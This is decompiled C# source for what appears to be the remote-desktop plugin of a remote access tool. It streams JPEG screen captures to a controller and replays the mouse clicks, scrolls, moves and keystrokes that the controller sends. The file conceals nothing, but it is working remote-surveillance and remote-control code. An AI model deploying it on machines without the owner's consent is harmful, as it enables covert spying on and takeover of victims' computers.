using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using DesktopDuplication;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	private const int MOUSEEVENTF_WHEEL = 2048;

	public static int quality = 0;

	public static EncoderParameters encoderParams;

	private static ImageCodecInfo encoder = ImageCodecInfo.GetImageEncoders().First((ImageCodecInfo c) => c.FormatID == ImageFormat.Jpeg.Guid);

	public const int DESKTOPVERTRES = 117;

	public const int DESKTOPHORZRES = 118;

	public static bool IsOk { get; set; }

	public static DesktopDuplicator desktopDuplicator { get; set; }

	[DllImport("user32.dll")]
	public static extern IntPtr GetDesktopWindow();

	[DllImport("user32.dll")]
	public static extern IntPtr GetWindowDC(IntPtr hWnd);

	[DllImport("user32.dll")]
	public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDc);

	[DllImport("gdi32.dll")]
	public static extern IntPtr CreateCompatibleDC(IntPtr hDc);

	[DllImport("gdi32.dll")]
	public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

	[DllImport("gdi32.dll")]
	public static extern IntPtr SelectObject(IntPtr hDc, IntPtr hObject);

	[DllImport("gdi32.dll")]
	public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

	[DllImport("gdi32.dll")]
	public static extern bool DeleteDC(IntPtr hdc);

	[DllImport("gdi32.dll")]
	public static extern bool DeleteObject(IntPtr hObject);

	public static void Read(byte[] data)
	{
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0139: Unknown result type (might be due to invalid IL or missing references)
		//IL_013e: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d5: Expected O, but got Unknown
		//IL_01eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f0: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			object[] array = LEB128.Read(data);
			string text = (string)array[0];
			if (text == null)
			{
				return;
			}
			switch (text.Length)
			{
			case 7:
				switch (text[0])
				{
				case 'C':
					if (!(text == "Capture"))
					{
						break;
					}
					if ((bool)array[1])
					{
						quality = (byte)array[2];
						encoderParams = new EncoderParameters(1);
						encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, (long)quality);
						if ((bool)array[3])
						{
							new Thread((ThreadStart)delegate
							{
								SharpDX();
							}).Start();
						}
						else
						{
							new Thread((ThreadStart)delegate
							{
								Start();
							}).Start();
						}
					}
					else
					{
						IsOk = false;
					}
					break;
				case 'Q':
					if (text == "Quality")
					{
						quality = (byte)array[1];
						encoderParams = new EncoderParameters(1);
						encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, (long)quality);
					}
					break;
				case 'S':
					if (!(text == "Sharpdx"))
					{
						break;
					}
					IsOk = false;
					Thread.Sleep(10);
					if ((bool)array[1])
					{
						new Thread((ThreadStart)delegate
						{
							SharpDX();
						}).Start();
						break;
					}
					desktopDuplicator?.Close();
					new Thread((ThreadStart)delegate
					{
						Start();
					}).Start();
					break;
				}
				break;
			case 11:
				if (text == "MouseScroll")
				{
					mouse_event(2048, 0, 0, (uint)(int)array[1], 0);
				}
				break;
			case 10:
				if (text == "MouseClick")
				{
					mouse_event((byte)array[1], 0, 0, 0u, 1);
				}
				break;
			case 9:
				if (text == "MouseMove")
				{
					Cursor.Position = new Point((int)array[1], (int)array[2]);
				}
				break;
			case 13:
				if (text == "KeyboardClick")
				{
					bool flag = (bool)array[1];
					keybd_event((int)array[2], 0, (!flag) ? 2u : 0u, UIntPtr.Zero);
				}
				break;
			case 8:
			case 12:
				break;
			}
		}
		catch (Exception ex)
		{
			Client.Error(ex.ToString());
		}
	}

	[DllImport("user32.dll")]
	private static extern void mouse_event(int dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);

	[DllImport("user32.dll")]
	internal static extern bool keybd_event(int bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

	public static void SharpDX()
	{
		if (IsOk)
		{
			return;
		}
		IsOk = true;
		try
		{
			desktopDuplicator = new DesktopDuplicator(0);
			while (IsOk)
			{
				try
				{
					DesktopFrame latestFrame = desktopDuplicator.GetLatestFrame();
					if (latestFrame != null)
					{
						Bitmap desktopImage = latestFrame.DesktopImage;
						Client.Send(LEB128.Write(new object[3]
						{
							"Desktop",
							"Screen",
							BitmapToByteArrayWithQuality(desktopImage, encoderParams)
						}));
						Client.keepPing.Last();
					}
				}
				catch (Exception)
				{
					IsOk = false;
				}
			}
			desktopDuplicator.Close();
		}
		catch (Exception)
		{
		}
	}

	[DllImport("user32.dll")]
	public static extern IntPtr GetDC(IntPtr hwnd);

	[DllImport("gdi32.dll")]
	public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

	private static float GetScalingFactor()
	{
		Graphics val = Graphics.FromHwnd(IntPtr.Zero);
		try
		{
			int deviceCaps = GetDeviceCaps(val.GetHdc(), 88);
			val.ReleaseHdc();
			return (float)deviceCaps / 96f;
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public static void Start()
	{
		if (IsOk)
		{
			return;
		}
		IsOk = true;
		_ = Screen.PrimaryScreen.Bounds.Left;
		_ = Screen.PrimaryScreen.Bounds.Top;
		IntPtr dC = GetDC(IntPtr.Zero);
		int deviceCaps = GetDeviceCaps(dC, 118);
		int deviceCaps2 = GetDeviceCaps(dC, 117);
		ReleaseDC(IntPtr.Zero, dC);
		float scalingFactor = GetScalingFactor();
		int nWidth = (int)((float)deviceCaps / scalingFactor);
		int nHeight = (int)((float)deviceCaps2 / scalingFactor);
		IntPtr desktopWindow = GetDesktopWindow();
		IntPtr windowDC = GetWindowDC(desktopWindow);
		IntPtr intPtr = CreateCompatibleDC(windowDC);
		while (IsOk)
		{
			if (!Client.itsConnect)
			{
				IsOk = false;
			}
			IntPtr intPtr2 = CreateCompatibleBitmap(windowDC, nWidth, nHeight);
			IntPtr hObject = SelectObject(intPtr, intPtr2);
			BitBlt(intPtr, 0, 0, nWidth, nHeight, windowDC, 0, 0, 13369376);
			Bitmap bitmap = Image.FromHbitmap(intPtr2);
			Client.Send(LEB128.Write(new object[3]
			{
				"Desktop",
				"Screen",
				BitmapToByteArrayWithQuality(bitmap, encoderParams)
			}));
			Client.keepPing.Last();
			SelectObject(intPtr, hObject);
			DeleteObject(intPtr2);
		}
		DeleteDC(intPtr);
		ReleaseDC(desktopWindow, windowDC);
	}

	public static byte[] BitmapToByteArrayWithQuality(Bitmap bitmap, EncoderParameters encoderParams)
	{
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		int num = ((Image)bitmap).Width / 2;
		int num2 = ((Image)bitmap).Height / 2;
		int num3;
		int num4;
		if (((Image)bitmap).Width > ((Image)bitmap).Height)
		{
			num3 = num;
			num4 = (int)((float)((Image)bitmap).Height * ((float)num / (float)((Image)bitmap).Width));
		}
		else
		{
			num3 = (int)((float)((Image)bitmap).Width * ((float)num2 / (float)((Image)bitmap).Height));
			num4 = num2;
		}
		Bitmap val = new Bitmap(num3, num4);
		try
		{
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			try
			{
				val2.InterpolationMode = (InterpolationMode)3;
				val2.SmoothingMode = (SmoothingMode)1;
				val2.CompositingQuality = (CompositingQuality)1;
				val2.DrawImage((Image)(object)bitmap, 0, 0, num3, num4);
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
			using MemoryStream memoryStream = new MemoryStream();
			((Image)val).Save((Stream)memoryStream, encoder, encoderParams);
			return memoryStream.ToArray();
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}
}
